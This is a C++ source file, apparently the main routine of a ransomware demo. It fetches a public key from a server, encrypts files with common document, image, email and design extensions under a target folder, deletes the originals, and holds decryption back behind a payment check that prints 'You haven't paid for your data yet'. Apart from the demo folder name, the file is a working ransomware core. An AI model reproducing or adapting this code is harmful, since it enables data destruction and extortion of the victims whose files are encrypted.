#include <iostream>
#include <array>
#include <fstream>

#include "Crypto.h"
#include "FileWalker.h"
#include "Network.h"
#include "PaymentException.h"


int main(int argc, char* argv[])
{
	CryptoPP::AutoSeededRandomPool rng;

	if (argc <= 1)
	{
		PublicKey publicKey;
		std::uint64_t clientId;
		std::tie(clientId, publicKey) = getPublicKey(rng);

		AESKey filemasterkey = generateKey(rng);
		save_key(filemasterkey, publicKey, rng);

		{
			std::ofstream idFile("idfile", std::ios::binary);
			if (!idFile)
			{
				std::cerr << "Could not read idfile\n";
				return EXIT_FAILURE;
			}
			idFile.write(reinterpret_cast<const char*>(&clientId), sizeof(clientId));
		}

		FileWalker fileWalker("C:\\RansomwareTest", [&filemasterkey, &rng](const std::string& filename) {
			std::cout << filename << "\n";
			encrypt_file(filename, filemasterkey, rng);
			deleteFile(filename);
		});
		fileWalker.addExtensions({
			".jpg",
			".jpeg",
			".png",
			".docx",
			".doc",
			".xslx",
			".xls",
			".ppt",
			".pptx",
			".pst",
			".ost",
			".blend",
			".3ds",
			".psd",
			".pdf",
			".svg",
			".accdb"
		});
		fileWalker.start();

		std::ofstream decryptBatch("decrypt.bat");
		decryptBatch << "@echo off\n";
		decryptBatch << "RansomwareDemo.exe decrypt";
	}
	else if (std::string(argv[1]) == "decrypt")
	{
		std::uint64_t clientId;
		{
			std::ifstream idFile("idfile", std::ios::binary);
			if (!idFile)
			{
				std::cerr << "Could not read idfile\n";
				return EXIT_FAILURE;
			}
			idFile.read(reinterpret_cast<char*>(&clientId), sizeof(clientId));
		}

		try
		{
			PrivateKey privateKey = getPrivateKey(rng, clientId);
			AESKey filemasterkey = loadKey(privateKey, rng);

			FileWalker decryptionWalker("C:\\RansomwareTest", [&filemasterkey, &rng](const std::string& filename) {
				std::cout << "Decrypting file " << filename << "\n";
				decrypt_file(filename, filemasterkey);
			});
			decryptionWalker.addExtension(".enc");
			decryptionWalker.start();
		}
		catch (PaymentException&)
		{
			std::cout << "You haven't paid for your data yet";
		}
		catch (std::exception& e)
		{
			std::cerr << typeid(e).name() << ": " << e.what() << "\n";
		}
	}
	
	std::cin.get();
}



